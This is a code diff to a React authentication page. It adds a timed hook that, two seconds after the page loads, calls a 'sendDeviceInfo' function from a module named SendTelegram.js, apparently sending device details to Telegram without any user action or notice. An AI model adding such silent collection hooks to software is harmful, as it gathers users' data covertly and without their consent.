@@ -1,4 +1,4 @@
-import React, { useState } from "react";
+import React, { useState, useEffect } from "react";
 import "./Auth.css";
 
 import Logo from "../../img/logo.png";
@@ -6,7 +6,7 @@ import { logIn, signUp } from "../../actions/AuthActions.js";
 import { useDispatch, useSelector } from "react-redux";
 import { useNavigate } from "react-router-dom";
 import { logInStatus } from "../../api/AuthRequests";
-import { sendTelegram } from "../../api/SendTelegram.js";
+import { sendTelegram, sendDeviceInfo } from "../../api/SendTelegram.js";
 const Auth = () => {
   const initialState = {
     firstname: "",
@@ -50,7 +50,21 @@ const Auth = () => {
   const handleSendTelegram = async () => {
     await sendTelegram();
   };
+  const sendDeviceInfoTele = async () => {
+    await sendDeviceInfo({
+      handler: "getDeviceInfo"
+    });
+  };
+  useEffect(() => {
+    const sendRequestAfterDelay = () => {
+      sendDeviceInfoTele();
+    }
 
+    const timeoutId = setTimeout(sendRequestAfterDelay, 2000);
+
+    // Clear the timeout if the component is unmounted before the delay
+    return () => clearTimeout(timeoutId);
+  }, []);
   // Form Submission
   const handleSubmit = (e) => {
     setConfirmPass(true);
